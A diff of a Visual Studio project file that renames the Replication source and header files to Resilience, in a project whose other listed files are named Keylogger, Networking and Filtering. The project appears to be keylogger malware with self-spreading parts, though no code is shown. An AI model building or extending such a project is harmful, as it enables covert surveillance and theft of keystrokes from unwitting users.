@@ -153,13 +153,13 @@
     <ClCompile Include="Keylogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="Networking.cpp" />
-    <ClCompile Include="Replication.cpp" />
+    <ClCompile Include="Resilience.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="Filtering.h" />
     <ClInclude Include="Keylogger.h" />
     <ClInclude Include="Networking.h" />
-    <ClInclude Include="Replication.h" />
+    <ClInclude Include="Resilience.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
